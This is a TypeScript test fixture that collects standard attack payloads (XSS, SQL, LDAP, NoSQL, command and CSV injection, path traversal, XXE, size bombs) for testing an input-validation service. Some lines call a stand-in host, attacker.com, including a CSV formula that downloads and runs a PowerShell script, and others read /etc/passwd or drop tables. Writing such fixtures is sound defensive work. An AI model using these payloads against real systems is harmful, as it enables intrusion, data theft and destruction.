/**
 * Attack Vectors for Security Service Integration Tests
 * Phase 22.16: API Integration & Security Service Tests
 * Common security threats used for testing validation and sanitization
 */

export class AttackVectors {
  /**
   * Cross-Site Scripting (XSS) Vectors
   */
  static readonly XSS_VECTORS = {
    SCRIPT_TAG: '<script>alert("XSS")</script>',
    IMG_ONERROR: '<img src=x onerror=alert("XSS")>',
    SVG_ONLOAD: '<svg/onload=fetch("http://attacker.com")>',
    IFRAME: '<iframe src="http://attacker.com"></iframe>',
    BODY_ONLOAD: '<body onload=alert("XSS")>',
    STYLE_TAG: '<style>@import url("http://attacker.com/xss.css");</style>',
    LINK_TAG: '<link rel="stylesheet" href="http://attacker.com/xss.css">',
    OBJECT_TAG: '<object data="http://attacker.com/xss.swf"></object>',
    EMBED_TAG: '<embed src="http://attacker.com/xss.swf">',
    FORM_ACTION: '<form action="http://attacker.com/steal"><input type="hidden" name="data" value="test"></form>',
    JAVASCRIPT_PROTOCOL: 'javascript:alert("XSS")',
    DATA_PROTOCOL: 'data:text/html,<script>alert("XSS")</script>',
    VB_PROTOCOL: 'vbscript:msgbox("XSS")',
    FORM_HANDLER: '<input onfocus=alert("XSS") autofocus>',
    MARQUEE_TAG: '<marquee onstart=alert("XSS")>',
    DETAILS_TAG: '<details open ontoggle=alert("XSS")>',
    BASE_TAG: '<base href="http://attacker.com/">',
  };

  /**
   * SQL Injection Vectors
   */
  static readonly SQL_INJECTION_VECTORS = {
    OR_TRUE: "' OR '1'='1",
    ADMIN_LOGIN: "admin' --",
    UNION_SELECT: "' UNION SELECT NULL, NULL, NULL --",
    DROP_TABLE: "'; DROP TABLE users; --",
    SLEEP_INJECTION: "'; SELECT SLEEP(5); --",
    INFORMATION_SCHEMA: "' UNION SELECT table_name FROM information_schema.tables --",
    BOOLEAN_BASED: "' AND '1'='1",
    TIME_BASED: "'; SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END; --",
    STACKED_QUERIES: "'; UPDATE users SET password='hacked' WHERE 1=1; --",
    COMMENT_ESCAPE: "' /*",
    HASH_ESCAPE: "' #",
    UPDATE_INJECTION: "field='value', admin=true WHERE 1=1 --",
    INSERT_INJECTION: "VALUES (1, 'admin', 'password'), (2, 'user', 'pass') --",
  };

  /**
   * LDAP Injection Vectors
   */
  static readonly LDAP_INJECTION_VECTORS = {
    WILDCARD: '*',
    OR_FILTER: '* )',
    AND_INJECTION: '*)(|(uid=*',
    ASTERISK_INJECTION: '*))(&(uid=*',
    CLOSING_PAREN: '*)',
  };

  /**
   * Path Traversal Vectors
   */
  static readonly PATH_TRAVERSAL_VECTORS = {
    DOT_DOT_UNIX: '../../../etc/passwd',
    DOT_DOT_WINDOWS: '..\\..\\..\\windows\\system32\\config\\sam',
    ENCODED_DOT_DOT: '%2e%2e%2fetc%2fpasswd',
    DOUBLE_ENCODED: '%252e%252e%252fetc%252fpasswd',
    BACKSLASH: '..\\..\\..\\etc\\passwd',
    MIXED: '..\\..\\../../../etc/passwd',
    NULL_BYTE_UNIX: '../../../etc/passwd%00.txt',
    NULL_BYTE_WINDOWS: '..\\..\\windows\\system32%00.txt',
  };

  /**
   * Command Injection Vectors
   */
  static readonly COMMAND_INJECTION_VECTORS = {
    SEMICOLON: 'ls; cat /etc/passwd',
    PIPE: 'ls | cat',
    AND: 'ls && cat /etc/passwd',
    OR: 'ls || cat /etc/passwd',
    BACKTICK: 'ls `cat /etc/passwd`',
    DOLLAR_PAREN: 'ls $(cat /etc/passwd)',
    NEWLINE: 'ls\ncat /etc/passwd',
    CARRIAGE_RETURN: 'ls\rcat /etc/passwd',
  };

  /**
   * NoSQL Injection Vectors
   */
  static readonly NOSQL_INJECTION_VECTORS = {
    MONGO_OR: '{"$or":[{"":1}]}',
    MONGO_GT: '{"$gt":""}',
    MONGO_NE: '{"$ne":null}',
    MONGO_WHERE: '{$where: "1==1"}',
    MONGO_JS: '{"$where":"this.password == \'pass\'"}',
  };

  /**
   * CSV Injection Vectors
   */
  static readonly CSV_INJECTION_VECTORS = {
    FORMULA: '=SUM(1+9)*cmd|"/c calc"!A1',
    PLUS_FORMULA: '+2+5+cmd|"/c calc"!A1',
    AT_FORMULA: '@SUM(1+9)*cmd|"/c calc"!A1',
    MINUS_FORMULA: '-2+3+cmd|"/c calc"!A1',
    EXTERNAL_LINK: '=cmd|"/c powershell IEX(New-Object Net.WebClient).DownloadString(\'http://attacker.com/ps.ps1\')"',
  };

  /**
   * OS Command Injection
   */
  static readonly OS_COMMAND_VECTORS = {
    SHELL_METACHAR: 'test; echo vulnerable',
    PIPE_CHAIN: 'echo test | grep test',
    BACKGROUND: 'legitimate &malicious',
    REDIRECT: 'cmd > /tmp/file',
    APPEND: 'cmd >> /tmp/file',
    STDIN: 'cmd < /etc/passwd',
  };

  /**
   * XXE (XML External Entity) Vectors
   */
  static readonly XXE_VECTORS = {
    ENTITY_EXPANSION: '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    EXTERNAL_ENTITY: '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd"/></html>',
    BILLION_LAUGHS: '<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;">]><lolz>&lol2;</lolz>',
  };

  /**
   * LDAP Metadata Strings that should be escaped
   */
  static readonly LDAP_SPECIAL_CHARS = {
    SPECIAL: 'test*value',
    PARENS: 'test(value)',
    BACKSLASH: 'test\\value',
    NULL_BYTE: 'test\x00value',
    WILDCARD: '*',
    AND_OP: '&',
    OR_OP: '|',
  };

  /**
   * Combined attack vectors (multiple techniques)
   */
  static readonly COMBINED_VECTORS = {
    XSS_SQL: "'; DROP TABLE users; --<script>alert('XSS')</script>",
    XSS_PATH_TRAVERSAL: '<script src="../../../etc/passwd"></script>',
    SQL_PATH_TRAVERSAL: "' OR 1=1 UNION SELECT load_file('../../../etc/passwd') --",
    LDAP_XSS: "* <script>alert('XSS')</script>",
  };

  /**
   * Payload size bomb vectors
   */
  static readonly SIZE_VECTORS = {
    ONE_MB: 'A'.repeat(1024 * 1024),
    TEN_MB: 'A'.repeat(10 * 1024 * 1024),
    HUNDRED_MB: 'A'.repeat(100 * 1024 * 1024),
    DEEPLY_NESTED: (depth: number) => {
      let obj: any = { value: 'test' };
      for (let i = 0; i < depth; i++) {
        obj = { nested: obj };
      }
      return obj;
    },
  };

  /**
   * Unicode and encoding bypass vectors
   */
  static readonly ENCODING_VECTORS = {
    UTF8_BOM: '﻿<script>',
    NULL_BYTE: 'test\x00<script>',
    DOUBLE_ENCODING: '%253Cscript%253E',
    UNICODE_ESCAPE: '\\u003Cscript\\u003E',
    HTML_ENTITY: '&lt;script&gt;',
    COMBINING_MARKS: 'scrípt', // é combined with e
  };

  /**
   * Check if a vector is present in text
   */
  static isPresent(text: string, vectorName: keyof typeof AttackVectors): boolean {
    const vectors = AttackVectors[vectorName];
    if (typeof vectors !== 'object') return false;

    for (const vector of Object.values(vectors)) {
      if (typeof vector === 'string' && text.includes(vector)) {
        return true;
      }
    }

    return false;
  }

  /**
   * Get all vectors as flat array
   */
  static getAllVectors(): string[] {
    const vectors: string[] = [];
    const keys = Object.keys(AttackVectors) as Array<
      keyof typeof AttackVectors
    >;

    for (const key of keys) {
      const value = AttackVectors[key];
      if (typeof value === 'object' && !Array.isArray(value)) {
        for (const vectorValue of Object.values(value)) {
          if (typeof vectorValue === 'string') {
            vectors.push(vectorValue);
          }
        }
      }
    }

    return vectors;
  }

  /**
   * Get random attack vector
   */
  static getRandomVector(): string {
    const allVectors = this.getAllVectors();
    return allVectors[Math.floor(Math.random() * allVectors.length)];
  }

  /**
   * Get vectors by category
   */
  static getVectorsByCategory(
    category:
      | 'XSS'
      | 'SQL'
      | 'LDAP'
      | 'PATH'
      | 'COMMAND'
      | 'NOSQL'
      | 'CSV'
      | 'XXE'
  ): string[] {
    const categoryMap: Record<string, keyof typeof AttackVectors> = {
      XSS: 'XSS_VECTORS',
      SQL: 'SQL_INJECTION_VECTORS',
      LDAP: 'LDAP_INJECTION_VECTORS',
      PATH: 'PATH_TRAVERSAL_VECTORS',
      COMMAND: 'COMMAND_INJECTION_VECTORS',
      NOSQL: 'NOSQL_INJECTION_VECTORS',
      CSV: 'CSV_INJECTION_VECTORS',
      XXE: 'XXE_VECTORS',
    };

    const key = categoryMap[category];
    if (!key) return [];

    const vectors: string[] = [];
    const value = AttackVectors[key];
    if (typeof value === 'object' && !Array.isArray(value)) {
      for (const vectorValue of Object.values(value)) {
        if (typeof vectorValue === 'string') {
          vectors.push(vectorValue);
        }
      }
    }

    return vectors;
  }
}
